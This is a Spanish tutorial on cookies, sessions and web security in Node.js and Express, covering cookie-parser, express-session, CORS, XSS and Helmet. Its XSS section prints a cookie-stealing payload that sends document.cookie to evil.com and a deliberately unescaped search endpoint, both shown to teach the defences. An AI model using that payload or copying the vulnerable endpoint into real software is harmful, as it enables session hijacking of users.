---
sidebar_position: 15
---
# Sesiones

## Cookies

Dentro del mundo del desarrollo web, seguramente has de haber escuchado el concepto de cookie. Hoy en día, las cookies son muy importantes ya que dentro de la mayoría de los sitios web tenemos modales que nos preguntan si las aceptamos o no.

Las cookies tienen muchas funciones, pero entre las más importantes es mantener nuestras sesiones en el navegador. Sin ellas, es lo mismo que cuando apagamos el javascript dentro del navegador. Esto aunque protegería nuestra privacidad en internet, nos limitaría en la cantidad de cosas que podemos definir para un proyecto.

De manera simple, las cookies son archivos de texto con pequeños datos, que se utilizan para identificar un ordenador cuando estás en internet.

Los datos generados dependen del sitio web, pero por lo general van acompañados con un ID exclusivo y la información específica que representan.

Debido a las leyes internacionales, como el Reglamento General de Protección de Datos (RGPD) de la UE, y a ciertas leyes estatales, como la Ley de Privacidad del Consumidor de California (CCPA), muchos sitios web ahora deben solicitar permiso para usar ciertas cookies con tu navegador y proporcionar información acerca de cómo se utilizarán las cookies si aceptas.

### Cookies mágicas y cookies HTTP
En general, todas las cookies funcionan de la misma manera, pero se han aplicado a diferentes casos de uso:

Cookies mágicas es una vieja expresión informática que se refiere a paquetes de información que se envían y reciben sin cambios en los datos. Estas se utilizarían normalmente para iniciar sesión en sistemas informáticos de bases de datos, como la red interna de una empresa. Este concepto es anterior al de "cookie" que usamos hoy.

Las cookies HTTP son una versión reutilizada de la "cookie mágica" creada para la navegación por Internet actual. En 1994, Lou Montulli, programador de navegadores web, se inspiró en la "cookie mágica" para crear la cookie HTTP, mientras ayudaba a una tienda de compras en línea a arreglar sus servidores sobrecargados. La cookie HTTP es lo que actualmente denominamos cookie de forma más general. También es lo que algunos ciber delincuentes pueden utilizar para espiar tu actividad en línea y piratear información personal.

Dentro de Node y express podemos hacer uso de las cookies para mantener y revisar una sesión de usuario.

Para comenzar vamos a definir un nuevo proyecto como siempre lo hacemos, ejecutando `npm init -y` e instalando solamente lo que vamos a usar:

```bash
npm i express ejs
```

> **Nota**: en versiones anteriores de este lab se instalaba también `body-parser`. Desde Express 4.16 (2017) **el middleware está integrado en Express**, así que ya no es necesario instalarlo por separado. Si ves `require('body-parser')` en código viejo, basta con reemplazarlo por `express.urlencoded(...)` o `express.json(...)` directamente.

Crea un archivo `index.js` con la configuración básica del servidor:

```javascript
const express = require('express');
const path    = require('path');
const app     = express();

app.set('view engine', 'ejs');
app.set('views', 'views');

app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (request, response) => {
    response.type('text/plain');
    response.send('Hola Mundo');
});

app.listen(3000, () => {
    console.log('Servidor en http://localhost:3000');
});
```

Para iniciar tu servidor con recarga automática, usa:

```bash
node --watch index.js
```

> **Sobre `node --watch`**: desde **Node.js 18+** el flag `--watch` es nativo — no necesitas instalar `nodemon` ni `pm2` para desarrollo. Reinicia el proceso cada vez que cambia un archivo del proyecto. `pm2` sigue siendo válido para producción (manejo de procesos, logs, restart automático ante crash), pero para escribir código en tu laptop, `node --watch` es lo más simple y no requiere dependencias.

## Tu primera cookie

Ahora vamos a crear una cookie. Dentro de la ruta `/` agrega `response.cookie(...)`:

```javascript
app.get('/', (request, response) => {
    response.cookie('mi_cookie', '123');
    response.type('text/plain');
    response.send('Hola Mundo');
});
```

`response.cookie(nombre, valor, opciones)` es la forma idiomática de Express para crear cookies. Internamente añade el header `Set-Cookie` que el navegador interpreta y guarda.

> **Para ver cómo funciona por debajo**: si quisieras escribir el header HTTP a mano (sin la ayuda de Express), el código equivalente sería `response.setHeader('Set-Cookie', 'mi_cookie=123')`. Es útil saberlo para entender que las cookies son simplemente un header HTTP estándar — no son magia. Pero en código real usa siempre `response.cookie()` porque te ahorra escapar valores, formatear fechas y serializar opciones a mano.

Para verla desde el navegador entra a **Inspeccionar elemento > Aplicación** (Application en inglés):

![lab_14](imgs/001.jpg)

Aquí vas a tener la opción de las cookies de tu sitio y adentro la lista completa de cookies generadas, ya sea de forma manual o automática por el sitio. Nota cómo `mi_cookie` aparece con el valor `123`.

## Leer cookies del lado del servidor: `cookie-parser`

Crear cookies está bien, pero nuestro servidor todavía no es capaz de leerlas cuando el navegador las regresa en peticiones siguientes. Para eso usamos la librería **cookie-parser**:

```bash
npm i cookie-parser
```

Configúrala en `index.js`, justo después de los otros middlewares:

```javascript
const cookieParser = require('cookie-parser');
app.use(cookieParser());
```

Tu archivo `index.js` debe verse así hasta este punto:

```javascript
const express      = require('express');
const path         = require('path');
const cookieParser = require('cookie-parser');
const app          = express();

app.set('view engine', 'ejs');
app.set('views', 'views');

app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(cookieParser());

app.get('/', (request, response) => {
    response.cookie('mi_cookie', '123');
    response.type('text/plain');
    response.send('Hola Mundo');
});

app.listen(3000, () => {
    console.log('Servidor en http://localhost:3000');
});
```

Ahora crea una nueva ruta `/test_cookie` que **lee** la cookie en lugar de crearla:

```javascript
app.get('/test_cookie', (request, response) => {
    const valor = request.cookies.mi_cookie;
    response.type('text/plain');
    response.send(valor || 'No hay cookie llamada mi_cookie');
});
```

El resultado: vas a ver el valor de tu cookie en el navegador.

![lab_14](imgs/003.jpg)

Fíjate cómo manejamos el caso de "no hay cookie todavía" devolviendo un mensaje claro. Sin ese fallback, `request.cookies.mi_cookie` sería `undefined` y enviaríamos una respuesta vacía — confusa para depurar.

## Cookies seguras: `HttpOnly`

Vamos a actualizar la cookie para marcarla como `HttpOnly`:

```javascript
response.cookie('mi_cookie', '123', { httpOnly: true });
```

La diferencia se ve en DevTools — ahora la columna **HttpOnly** queda marcada:

![lab_14](imgs/004.jpg)

> **Qué hace `HttpOnly`**: bloquea el acceso a la cookie desde JavaScript del lado del cliente. `document.cookie` ya no la incluye. Esto protege contra una clase entera de ataques (**XSS**, que veremos al final del laboratorio): si un atacante logra inyectar un `<script>` en tu página, **no podrá robar las cookies marcadas como HttpOnly** porque ni siquiera son visibles para el JavaScript del navegador. La cookie sigue viajando en cada petición HTTP automáticamente, así que el servidor la sigue recibiendo — solo el código del cliente queda excluido.

> **Regla práctica**: cualquier cookie que use tu servidor para identificar al usuario (cookie de sesión, token de autenticación) **debe** estar marcada como `HttpOnly`. Si una cookie solo guarda preferencias visuales (tema, idioma) y necesitas leerla desde el frontend, entonces `HttpOnly` no aplica.

> **Cuidado con duplicados al probar**: si llamas `response.cookie('mi_cookie', '123')` y luego `response.cookie('mi_cookie', '123', { httpOnly: true })`, el navegador termina con dos entradas hasta que limpies. En desarrollo conviene limpiar las cookies del sitio (botón **Clear storage** en DevTools) cada vez que cambies opciones.

## Express session

Ya manejamos lo básico de cookies del lado del cliente y del servidor. Ahora vamos a algo un poco más elaborado: el manejo de la **sesión de usuario**.

Para ello usaremos la librería **express-session**:

```bash
npm i express-session
```

E inicialízala en `index.js`:

```javascript
const session = require('express-session');

app.use(session({
    secret: 'mi string secreto que debe ser un string aleatorio muy largo, no como éste',
    resave: false,             // La sesión no se guarda en cada petición, sólo si algo cambió
    saveUninitialized: false   // No guarda sesiones para peticiones que no las necesitan
}));
```

> **Sobre `secret`**: este string firma la cookie de sesión. Si alguien lo adivina o lo filtra, puede falsificar cookies y suplantar a cualquier usuario. En desarrollo cualquier valor sirve, pero en producción genera uno con `openssl rand -hex 32` y guárdalo en una variable de entorno (`process.env.SESSION_SECRET`). **Nunca lo subas al repositorio**.

El archivo completo debe verse así hasta este punto:

```javascript
const express      = require('express');
const path         = require('path');
const cookieParser = require('cookie-parser');
const session      = require('express-session');
const app          = express();

app.set('view engine', 'ejs');
app.set('views', 'views');

app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(cookieParser());
app.use(session({
    secret: 'mi string secreto que debe ser un string aleatorio muy largo, no como éste',
    resave: false,
    saveUninitialized: false
}));

app.get('/', (request, response) => {
    response.cookie('mi_cookie', '123', { httpOnly: true });
    response.type('text/plain');
    response.send('Hola Mundo');
});

app.get('/test_cookie', (request, response) => {
    const valor = request.cookies.mi_cookie;
    response.type('text/plain');
    response.send(valor || 'No hay cookie llamada mi_cookie');
});

app.listen(3000, () => {
    console.log('Servidor en http://localhost:3000');
});
```

Con la sesión configurada **no estamos creando una cookie visible más** — estamos creando una sesión que vive del lado del servidor, identificada por una cookie firmada que el navegador y el servidor intercambian automáticamente. Si revisas en el navegador, la cookie de la sesión aparece con un nombre tipo `connect.sid` y un valor cifrado.

Aquí la ventaja del servidor es que de manera automática este establece la forma de conexión entre los datos, permitiéndonos guardar información dentro de la sesión. Puedes verlo como **una cookie que vive del lado del servidor** — el navegador solo guarda el ID, los datos reales nunca salen del backend.

Al igual que con las cookies, la recomendación es guardar **poca** información en la sesión, tanto por rendimiento del servidor como para evitar comprometer información importante.

Más adelante, en otros laboratorios, veremos cómo hacer uso más especializado de la sesión. Por ahora quédate con la forma básica de crear, modificar y eliminar datos.

Agrega 3 nuevas rutas:

```javascript
app.get('/test_session', (request, response) => {
    request.session.mi_variable = 'valor';
    response.type('text/plain');
    response.send(request.session.mi_variable);
});

app.get('/test_session_variable', (request, response) => {
    const valor = request.session.mi_variable;
    response.type('text/plain');
    response.send(valor || 'No hay variable de sesión definida. Visita /test_session primero.');
});

app.get('/logout', (request, response) => {
    request.session.destroy(() => {
        response.redirect('/');
    });
});
```

- `/test_session` añade una variable a la sesión, a la que podemos acceder de inmediato.
- `/test_session_variable` accede a esa variable en cualquier momento — siempre y cuando hayamos creado primero el valor y el servidor no se haya reiniciado. Si la variable no existe, mostramos un mensaje claro en lugar de una respuesta vacía.
- `/logout` destruye la sesión y vacía la información almacenada hasta ese momento.

> **Nota didáctica**: la sesión vive en memoria del proceso, así que se pierde cuando reinicias el servidor. En producción se usa un store persistente (Redis, MongoDB, PostgreSQL) — eso queda fuera de alcance del lab.

Es muy sencillo el uso, pero verifica bien los momentos de creación, actualización y eliminación. Es muy común perder una sesión por no atender el ciclo que puede seguir un usuario y llegar a caminos sin salida donde se borró la sesión pero todavía se necesitaba la información.

---

Hasta aquí cubrimos el lab original. Las siguientes tres secciones son contenido nuevo que conecta con el manejo de sesiones desde la perspectiva de **seguridad web**. Son los tres temas con los que te vas a topar en el primer mes de cualquier proyecto serio: **CORS**, **XSS** y **headers de seguridad** (Helmet.js).

## CORS — el error que todos vemos al menos una vez

Tarde o temprano vas a escribir un frontend (React, Vue, una página estática) que intenta llamar a tu API de Express y recibirás este error en la consola del navegador:

```
Access to fetch at 'http://localhost:3000/api/datos' from origin 'http://localhost:5173'
has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present
on the requested resource.
```

No es un bug en tu código. Es el navegador haciendo su trabajo.

### El problema: Same-Origin Policy

Los navegadores modernos imponen la **Same-Origin Policy**: el JavaScript que corre en una página solo puede hacer peticiones a su mismo origen por default. Un origen es la combinación de **protocolo + host + puerto**:

| URL                            | Origen                       |
|--------------------------------|------------------------------|
| `http://localhost:3000/a`      | `http://localhost:3000`      |
| `http://localhost:3000/b`      | `http://localhost:3000` ✅ mismo |
| `http://localhost:5173/a`      | `http://localhost:5173` ❌ puerto distinto |
| `https://localhost:3000/a`     | `https://localhost:3000` ❌ protocolo distinto |
| `http://api.example.com:3000/a`| `http://api.example.com:3000` ❌ host distinto |

**Por qué existe**: si el navegador no impusiera esta regla, una página maliciosa que abrieras (`evil.com`) podría hacer `fetch('https://tu-banco.com/transferir')` con tus cookies de sesión adjuntas automáticamente y vaciar tu cuenta. La Same-Origin Policy es el mecanismo principal que evita ese tipo de ataque.

### El flujo del problema

Imagina que tienes:

- Tu API Express corriendo en `http://localhost:3000`.
- Un frontend React (Vite) corriendo en `http://localhost:5173`.

Cuando el frontend intenta `fetch('http://localhost:3000/api/datos')`:

```
   ┌─────────────────────┐                          ┌─────────────────────┐
   │  Browser (5173)     │                          │  Express API (3000) │
   │  (frontend React)   │                          │                     │
   └──────────┬──────────┘                          └──────────┬──────────┘
              │                                                │
              │  1. fetch('http://localhost:3000/api/datos')   │
              │  ─────────────────────────────────────────────>│
              │                                                │
              │  2. Respuesta HTTP 200 con datos JSON          │
              │  <─────────────────────────────────────────────│
              │                                                │
              │  3. Browser revisa headers de la respuesta:    │
              │     ¿Tiene Access-Control-Allow-Origin?        │
              │     → NO                                       │
              │                                                │
              │  4. Browser BLOQUEA la respuesta.              │
              │     El JavaScript recibe un error.             │
              │     El servidor sí respondió, pero el          │
              │     navegador no le pasa los datos al JS.      │
              │                                                │
```

Detalle clave que confunde a todos: **el servidor sí respondió y mandó los datos**. Si abres la pestaña Network de DevTools vas a ver el request con status 200 y el body completo. Lo que pasa es que el navegador, al ver que falta el header `Access-Control-Allow-Origin`, **no le entrega esa respuesta al JavaScript que la pidió**. Por eso CORS no es una protección del servidor — es una protección del navegador para el usuario.

### La solución: el middleware `cors`

```bash
npm i cors
```

```javascript
const cors = require('cors');

// Permite cualquier origen (útil en desarrollo, no en producción)
app.use(cors());
```

Eso es todo lo que necesitas para que el error desaparezca en desarrollo. Lo que hace internamente `cors()` es agregar el header `Access-Control-Allow-Origin: *` a todas las respuestas, lo que le dice al navegador "cualquier origen puede leer esta respuesta".

Para producción **no uses `cors()` sin opciones**. Especifica exactamente qué orígenes permites:

```javascript
app.use(cors({
    origin: ['https://miapp.com', 'https://www.miapp.com'],
    credentials: true   // necesario si vas a enviar cookies entre dominios
}));
```

> **Regla práctica**: en desarrollo `cors()` sin opciones está bien. En producción **siempre** lista los orígenes que permites — un `Access-Control-Allow-Origin: *` en producción anula buena parte de la protección que el navegador te estaba dando.

> **Cuidado con `credentials`**: si tu frontend manda cookies (sesión, JWT en cookie) en peticiones cross-origin, necesitas `credentials: true` del lado del servidor **y** `fetch(url, { credentials: 'include' })` del lado del cliente. Y en este caso el navegador **no acepta** `origin: '*'` — exige un origen específico.

## XSS — Cross-Site Scripting

XSS es el ataque que motivó la existencia del flag `HttpOnly` que vimos antes. Vale la pena entenderlo a fondo porque es **el ataque web #1 más común** según OWASP, y porque la defensa no es una sola línea de código sino un conjunto de prácticas.

### Qué es XSS

**XSS = inyectar JavaScript ejecutable en una página que otro usuario va a ver.** Cuando la víctima abre la página, el navegador ejecuta el código del atacante con los mismos permisos que el código legítimo del sitio: puede leer cookies (las que no sean HttpOnly), puede hacer fetch a la API con la sesión de la víctima, puede redirigir, puede inyectar formularios falsos.

Hay dos sabores principales: **reflejado** y **persistente** (también llamado *stored*).

### XSS reflejado

El payload viaja en la URL y la página lo refleja directamente al HTML sin escapar.

```
   ┌──────────┐                ┌──────────┐                ┌──────────┐
   │ Atacante │                │ Víctima  │                │ Servidor │
   └─────┬────┘                └─────┬────┘                └─────┬────┘
         │                           │                           │
         │ 1. Manda link por correo  │                           │
         │    o chat:                │                           │
         │    /buscar?q=<script>...  │                           │
         │ ──────────────────────────>                           │
         │                           │                           │
         │                           │ 2. La víctima da clic     │
         │                           │ ──────────────────────────>
         │                           │                           │
         │                           │ 3. El servidor renderiza  │
         │                           │    HTML que incluye q     │
         │                           │    SIN ESCAPARLO          │
         │                           │ <──────────────────────────
         │                           │                           │
         │                           │ 4. El navegador ejecuta   │
         │                           │    el <script> recibido   │
         │                           │                           │
         │                           │ 5. El script lee          │
         │                           │    document.cookie y la   │
         │                           │    manda al atacante      │
         │ <──────────────────────────                           │
         │                           │                           │
         │ 6. El atacante usa la     │                           │
         │    cookie para suplantar  │                           │
         │    a la víctima           │                           │
         │                           │                           │
```

Ejemplo concreto. Un endpoint de búsqueda hecho ingenuamente:

```javascript
app.get('/buscar', (request, response) => {
    const q = request.query.q || '';
    response.send(`<h1>Resultados para: ${q}</h1>`);
});
```

Si el atacante manda a la víctima el link:

```
http://miapp.com/buscar?q=<script>fetch('https://evil.com/?c='+document.cookie)</script>
```

El servidor responde con:

```html
<h1>Resultados para: <script>fetch('https://evil.com/?c='+document.cookie)</script></h1>
```

Y el navegador de la víctima ejecuta el script. Si las cookies no están marcadas como `HttpOnly`, el atacante recibe la cookie de sesión y suplanta a la víctima.

### XSS persistente

Aún peor: el payload se guarda en la base de datos y se sirve a todos los usuarios que vean ese contenido (un comentario en un foro, un perfil de usuario, una reseña).

```
   ┌──────────┐         ┌──────────┐         ┌──────────┐         ┌────┐
   │ Atacante │         │ Servidor │         │ Víctima  │         │ DB │
   └─────┬────┘         └─────┬────┘         └─────┬────┘         └─┬──┘
         │                    │                    │                │
         │ 1. POST /comentar  │                    │                │
         │    con <script>... │                    │                │
         │ ─────────────────> │                    │                │
         │                    │ 2. INSERT comment  │                │
         │                    │ ──────────────────────────────────> │
         │                    │                    │                │
         │                    │                    │                │
         │                    │ 3. La víctima      │                │
         │                    │    visita la página│                │
         │                    │ <──────────────────│                │
         │                    │ 4. SELECT comments │                │
         │                    │ ──────────────────────────────────> │
         │                    │ 5. comments        │                │
         │                    │ <────────────────────────────────── │
         │                    │ 6. Renderiza HTML  │                │
         │                    │    con <script>... │                │
         │                    │ ─────────────────> │                │
         │                    │                    │                │
         │                    │                    │ 7. El browser  │
         │                    │                    │    ejecuta el  │
         │                    │                    │    script de   │
         │                    │                    │    todos los   │
         │                    │                    │    visitantes  │
         │                    │                    │                │
```

Este es el más peligroso porque **se ejecuta en cada visitante** sin que nadie tenga que hacer clic en un link sospechoso. Es lo que pasó con el famoso *Samy worm* en MySpace en 2005 — un comentario en un perfil ejecutó código que copiaba el comentario a los perfiles de quienes lo veían, propagándose a más de un millón de usuarios en 20 horas.

### Las defensas

XSS no se mitiga con una sola línea. Es defensa en profundidad:

1. **Escapar la salida** (la más importante). Cuando renderices datos del usuario en HTML, conviértelos a entidades HTML (`<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`). **EJS lo hace automáticamente con `<%= variable %>`**. La sintaxis peligrosa es `<%- variable %>` (con guion), que renderiza HTML crudo — usa solo cuando estás 100% seguro de que el contenido viene de fuente confiable.

   ```ejs
   <!-- Seguro: escapa automáticamente -->
   <h1>Resultados para: <%= q %></h1>

   <!-- Peligroso: NO escapa, permite XSS -->
   <h1>Resultados para: <%- q %></h1>
   ```

2. **Cookies con `HttpOnly`** (defensa de daños). Si a pesar de todo un atacante logra inyectar un script, al menos no podrá robar las cookies de sesión.

3. **`SameSite=Lax` o `Strict`** en cookies de sesión (defensa contra CSRF, complementaria a XSS):
   ```javascript
   response.cookie('mi_cookie', '123', { httpOnly: true, sameSite: 'lax' });
   ```

4. **Content Security Policy (CSP)**: un header HTTP que le dice al navegador *"solo ejecuta scripts que vengan de estos orígenes"*. Si el atacante logra inyectar `<script>...</script>` inline pero tu CSP solo permite scripts de tu dominio, el navegador se niega a ejecutarlo. CSP es complejo de configurar a mano — afortunadamente Helmet.js lo facilita, lo veremos en la siguiente sección.

5. **Validar entrada en el servidor**: rechaza inputs que claramente no son válidos (un campo "edad" que contiene `<script>` debe rechazarse antes de llegar a la base).

> **La lección clave**: XSS es responsabilidad del **renderizado**, no de la entrada. Aunque guardes texto malicioso en la base, si lo escapas correctamente al renderizarlo, no hay ataque. Por eso EJS escapa por default — para que el caso seguro sea el caso fácil.

## Helmet.js — headers de seguridad por default

Configurar manualmente todos los headers de seguridad que un sitio moderno debe tener (CSP, X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security, Referrer-Policy, etc.) es tedioso y fácil de olvidar. **Helmet** es un middleware de Express que aplica un conjunto razonable de defaults con una sola línea.

```bash
npm i helmet
```

```javascript
const helmet = require('helmet');
app.use(helmet());
```

Pónlo lo más arriba posible en tu cadena de middlewares, antes de las rutas.

### Qué hace Helmet por ti

Con `helmet()` sin opciones, tu servidor empieza a enviar estos headers en todas las respuestas:

| Header | Qué hace |
|--------|----------|
| `Content-Security-Policy` | Restringe de dónde se pueden cargar scripts, estilos, imágenes, fuentes. Frena XSS aunque haya un error de escapado. |
| `X-Frame-Options: SAMEORIGIN` | Evita que tu sitio se cargue en un `<iframe>` desde otro dominio (defensa contra **clickjacking**). |
| `X-Content-Type-Options: nosniff` | Le dice al navegador que respete el `Content-Type` que mandas y no intente "adivinar" el tipo. Bloquea ataques de **MIME sniffing**. |
| `Strict-Transport-Security` | Fuerza al navegador a usar HTTPS para todas las peticiones futuras al dominio. |
| `Referrer-Policy: no-referrer` | Reduce qué información viaja en el header `Referer` cuando navegas fuera de tu sitio. |
| `X-DNS-Prefetch-Control` | Controla el prefetching de DNS. |
| `X-Download-Options` | (Legacy de IE8) Evita que descargas se abran en el contexto del sitio. |
| `Origin-Agent-Cluster` | Aísla tu origen del clúster de procesos del navegador. |
| `Cross-Origin-*-Policy` | Control fino sobre cómo otros orígenes pueden interactuar con tu página. |

### Verificar que funciona

Reinicia tu servidor y haz una petición desde la terminal:

```bash
curl -I http://localhost:3000
```

Vas a ver en la respuesta una decena de headers nuevos que antes no estaban — `Content-Security-Policy`, `X-Frame-Options: SAMEORIGIN`, etc. También puedes inspeccionarlos en DevTools > Network > selecciona la petición > pestaña **Headers** > **Response Headers**.

### Cuándo personalizar Helmet

Los defaults de Helmet son conservadores. Si tu sitio carga librerías externas (Google Fonts, una CDN de jQuery, scripts de analítica), la **Content Security Policy** por default va a **bloquearlos**. Vas a ver errores en la consola del navegador tipo:

```
Refused to load the script 'https://cdn.jsdelivr.net/...' because it violates
the following Content Security Policy directive: "script-src 'self'".
```

La solución es **declarar explícitamente** los orígenes que confías:

```javascript
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            "script-src":  ["'self'", "https://cdn.jsdelivr.net"],
            "style-src":   ["'self'", "https://fonts.googleapis.com", "'unsafe-inline'"],
            "font-src":    ["'self'", "https://fonts.gstatic.com"],
            "img-src":     ["'self'", "data:", "https:"]
        }
    }
}));
```

> **La lección clave de CSP**: el patrón es **deny-by-default + allowlist explícita**. Cada vez que un script se rompe, decides si es legítimo (lo añades) o sospechoso (lo bloqueas y revisas qué lo cargó). Esto hace que XSS sea mucho más difícil de explotar — aunque el atacante logre inyectar `<script src="https://evil.com/...">`, el navegador se niega a cargarlo porque `evil.com` no está en tu allowlist.

### Helmet + el resto del lab

Tu `index.js` final con todas las protecciones queda más o menos así:

```javascript
const express      = require('express');
const path         = require('path');
const cookieParser = require('cookie-parser');
const session      = require('express-session');
const cors         = require('cors');
const helmet       = require('helmet');
const app          = express();

app.set('view engine', 'ejs');
app.set('views', 'views');

app.use(helmet());
app.use(cors());
app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(cookieParser());
app.use(session({
    secret: 'mi string secreto que debe ser un string aleatorio muy largo, no como éste',
    resave: false,
    saveUninitialized: false,
    cookie: { httpOnly: true, sameSite: 'lax' }
}));

// ... rutas
```

> **Sobre el orden de middlewares**: Helmet primero (los headers se aplican a TODO, incluyendo errores), luego CORS, luego parsers, luego sesión, luego rutas. Si pones Helmet al final, las rutas que respondan antes no recibirán los headers de seguridad.

## Siguientes pasos

- Investiga el ataque **CSRF (Cross-Site Request Forgery)** — la otra cara de XSS. La defensa estándar es un **CSRF token** en formularios. El paquete `csurf` está deprecado; usa `csrf-csrf` para proyectos nuevos.
- Lee el [OWASP Top 10](https://owasp.org/www-project-top-ten/) — la lista de las 10 vulnerabilidades web más frecuentes. Cada una merece un par de horas de lectura.
- Si vas a desplegar a producción, configura un **store persistente** para sesiones (`connect-redis`, `connect-mongo`, `connect-pg-simple`) — la default in-memory pierde sesiones cada vez que reinicia el servidor y no escala a múltiples instancias.
- Aprende sobre **CSP nonces** y **`strict-dynamic`** para tener una CSP estricta sin desactivar `'unsafe-inline'`.
